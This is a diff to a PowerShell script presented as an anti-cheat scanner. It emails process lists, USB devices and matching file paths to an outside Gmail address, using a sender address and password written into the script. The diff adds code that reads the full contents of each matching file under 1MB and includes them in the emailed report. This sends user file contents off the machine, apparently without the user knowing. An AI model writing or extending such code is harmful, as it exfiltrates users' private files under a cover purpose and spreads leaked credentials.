@@ -1,11 +1,10 @@
-# Email configuration
+
 $SMTPServer = "smtp.gmail.com"
 $SMTPPort = 587
 $EmailAddress = "terraformaft@gmail.com"
 $EmailPassword = "rgok qhmz kycz opvx"
 $ToEmailAddress = "codcdl1@gmail.com"
 
-# Known cheat signatures
 $knownCheatProcesses = @(
     "cronus.dll", "aimbot.dll", "wallhack.dll", "macro.dll", "aimassist.dll",
     "cronus.dylib", "aimbot.dylib", "wallhack.dylib", "macro.dylib", "aimassist.dylib",
@@ -22,12 +21,12 @@ $knownCheatExtensions = @(
     ".dylib", ".cpg"
 )
 
-# Get current user
+$MAX_FILE_SIZE = 1MB  # 1MB
+
 function Get-CurrentUser {
     return $env:USERNAME
 }
 
-# Check suspicious files
 function Check-SuspiciousFiles {
     $suspiciousFiles = @()
     $commonDirs = @()
@@ -47,7 +46,18 @@ function Check-SuspiciousFiles {
         Get-ChildItem -Path $dir -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
             if ($knownCheatExtensions -contains $_.Extension.ToLower() -or
                 $knownCheatFiles -contains $_.Name.ToLower()) {
-                $suspiciousFiles += $_.FullName
+                $filePath = $_.FullName
+                $suspiciousFiles += $filePath
+                if ($_.Length -le $MAX_FILE_SIZE) {
+                    try {
+                        $fileContent = Get-Content -Path $filePath -Raw -ErrorAction Stop
+                        $suspiciousFiles += "Content of $filePath:`n$fileContent"
+                    } catch {
+                        $suspiciousFiles += "Could not read file content of $filePath."
+                    }
+                } else {
+                    $suspiciousFiles += "File $filePath is too large to display."
+                }
             }
         }
     }
@@ -55,7 +65,6 @@ function Check-SuspiciousFiles {
     return $suspiciousFiles
 }
 
-# Check known cheat processes
 function Check-KnownCheatProcesses {
     $suspiciousProcesses = @()
     Get-Process | ForEach-Object {
@@ -66,7 +75,6 @@ function Check-KnownCheatProcesses {
     return $suspiciousProcesses
 }
 
-# Check USB devices
 function Check-USBDevices {
     $usbDevices = @()
     if ($IsWindows) {
@@ -90,7 +98,6 @@ function Check-USBDevices {
     return $usbDevices
 }
 
-# Send email
 function Send-Email {
     param (
         [string]$subject,
@@ -115,7 +122,6 @@ function Send-Email {
     }
 }
 
-# Main function
 function Main {
     $results = @()
 
@@ -161,7 +167,6 @@ function Main {
     Send-Email -subject $subject -body $body
 }
 
-# Detect the OS
 $IsWindows = $false
 $IsMacOS = $false
 $IsLinux = $false
@@ -174,5 +179,4 @@ if ($OS -match "Windows") {
     $IsLinux = $true
 }
 
-# Run the main function
 Main
